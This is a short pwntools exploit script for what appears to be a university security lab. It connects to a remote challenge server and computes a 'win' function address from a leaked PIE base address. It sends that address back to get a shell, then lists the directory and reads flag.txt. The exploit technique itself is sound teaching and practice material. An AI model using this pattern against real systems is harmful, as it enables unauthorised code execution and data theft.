from pwn import *
import os

# connect to local binary process
# p = processs("./lab1-3.bin")

# connect to remote server process at port 7011
p = remote("csc748.hostbin.org", 7013)

# read response
print("")
response =  p.recvline().decode("utf-8")
response += p.recvline().decode("utf-8")
print(response)

# get based addresss
hexBaseAddr = str(response[28:40])

# print(type(hexBaseAddr)) # Testing code
# print(hexBaseAddr) #Testing code

# convert to integer and print response as decimal
decBaseAddr = int(hexBaseAddr, 16)
print(f"The base address in decimal is: {decBaseAddr}")
print("")

# call win function using address = base addr + win function offset
# objdump on binary provide win function offset of 0x140a
# 0x140a converts to decimal 5130 
winFuncAddr = decBaseAddr + 5130
print(f'The address of "win" function is: {winFuncAddr}')

# convert to bytes and print
winFuncAddrBytes = bytes(str(winFuncAddr), 'utf-8')
print("")
print(f'The address of "win" function as a byte is: {winFuncAddrBytes}')
print("")

# send back PIE  address of "win" function in decimal
print('Calling "win" function [+][+][+][+][+][+][+][+]')
p.sendline(winFuncAddrBytes)
print("")

#  List dir and print flag.txt
p.sendline(b'echo "Listing and printing the flag [+][+][+][+][+]"')
p.sendline(b'echo ""')
p.sendline(b'ls -alh')
p.sendline(b'echo "";')
p.sendline(b'cat flag.txt')
p.sendline(b'echo ""')

# establish interactive session
p.interactive()
